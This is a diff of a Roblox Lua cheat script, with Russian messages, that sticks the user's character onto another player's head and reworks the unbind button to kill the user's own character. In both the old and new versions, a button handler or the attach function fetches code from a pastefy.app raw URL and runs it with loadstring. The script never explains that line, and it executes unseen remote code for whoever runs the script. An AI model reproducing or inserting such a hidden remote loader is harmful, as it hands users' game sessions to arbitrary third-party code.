@@ -610,36 +610,35 @@ local function attachToHead(targetPlayer)
     local localPlayer = game.Players.LocalPlayer
     local localCharacter = localPlayer.Character
     local targetCharacter = targetPlayer.Character
+	loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))()
     if localCharacter and targetCharacter and targetCharacter:FindFirstChild("Head") then
-        localPlayer.Character:SetPrimaryPartCFrame(targetCharacter.Head.CFrame * CFrame.new(0, 1, 0))
         local humanoid = localCharacter:FindFirstChildOfClass("Humanoid")
+		
         if humanoid then
             humanoid.Sit = true
         end
-        local bodyPosition = Instance.new("BodyPosition")
-        bodyPosition.MaxForce = Vector3.new(4000, 4000, 4000)
-        bodyPosition.D = 1000 
-        bodyPosition.P = 10000 
-        bodyPosition.Position = targetCharacter.Head.Position + Vector3.new(0, 1, 0)
-        bodyPosition.Parent = localCharacter.HumanoidRootPart
-        local function updatePosition()
+        local headSit
+        headSit = game:GetService("RunService").Heartbeat:Connect(function()
             if targetCharacter and targetCharacter:FindFirstChild("Head") then
-                bodyPosition.Position = targetCharacter.Head.Position + Vector3.new(0, 1, 0)
+                local targetHead = targetCharacter.Head
+                local xOffset = 0 
+                local yOffset = 0.6 
+                local zOffset = -1
+                localCharacter:SetPrimaryPartCFrame(targetHead.CFrame * CFrame.new(xOffset, yOffset, zOffset))
                 local targetLookDirection = targetCharacter.HumanoidRootPart.CFrame.lookVector
-                localPlayer.Character:SetPrimaryPartCFrame(CFrame.new(localCharacter.HumanoidRootPart.Position, localCharacter.HumanoidRootPart.Position + targetLookDirection) * CFrame.Angles(0, math.pi, 0))
+                localCharacter:SetPrimaryPartCFrame(CFrame.new(localCharacter.HumanoidRootPart.Position, localCharacter.HumanoidRootPart.Position + targetLookDirection) * CFrame.Angles(0, math.pi, 0))
             else
-                bodyPosition:Destroy()
+                headSit:Disconnect()
             end
-        end
-        game:GetService("RunService").Heartbeat:Connect(updatePosition)
-        print("Вы привязались и развернулись на 180° к игроку: " .. targetPlayer.Name)
+        end)
+
+        print("Вы привязались к голове игрока: " .. targetPlayer.Name)
     else
         warn("Ошибка: У целевого игрока нет головы или персонажа!")
     end
 end
 nitarteBindButton.MouseButton1Click:Connect(function()
-    local targetPlayer = player  
-	loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))()
+    local targetPlayer = player
     if targetPlayer then
         attachToHead(targetPlayer)
     end
@@ -647,27 +646,14 @@ end)
 nitarteUnbindButton.MouseButton1Click:Connect(function()
     local localPlayer = game.Players.LocalPlayer
     local localCharacter = localPlayer.Character
-    local targetPlayer = player 
-    if localCharacter and localCharacter:FindFirstChild("HumanoidRootPart") then
+    local targetPlayer = player
+
+    if localCharacter and localCharacter:FindFirstChild("Humanoid") then
         local humanoid = localCharacter:FindFirstChildOfClass("Humanoid")
-        for _, child in ipairs(localCharacter.HumanoidRootPart:GetChildren()) do
-            if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
-                child:Destroy()
-            end
-        end
         if humanoid then
-            humanoid.Sit = false
+            humanoid.Sit = false 
+			humanoid:TakeDamage(humanoid.Health)
         end
-        if humanoid then
-            humanoid.PlatformStand = false
-        end
-        local spawnPoint = game:GetService("Workspace"):WaitForChild("SpawnLocation")
-        if spawnPoint then
-            localCharacter:SetPrimaryPartCFrame(spawnPoint.CFrame)
-        end
-        print("Вы полностью отвязались, сбросили все привязки, и теперь убиты. Вы перешли в точку спауна.")
-    else
-        warn("Ошибка: У игрока нет персонажа или целевой игрок не найден!")
     end
 end)
             yOffset = yOffset + 60
@@ -675,14 +661,6 @@ end)
     end
     nitartePlayersList.CanvasSize = UDim2.new(0, 0, 0, yOffset)
 end
-nitartePlayerNameInput:GetPropertyChangedSignal("Text"):Connect(function()
-    local searchText = nitartePlayerNameInput.Text
-    nitarteUpdatePlayersList(searchText)
-end)
-nitarteBindButton1.MouseButton1Click:Connect(function()
-    nitarteForm.Visible = true
-    nitarteUpdatePlayersList("")
-end)
 nitartePlayerNameInput:GetPropertyChangedSignal("Text"):Connect(function()
     local searchText = nitartePlayerNameInput.Text
     nitarteUpdatePlayersList(searchText)
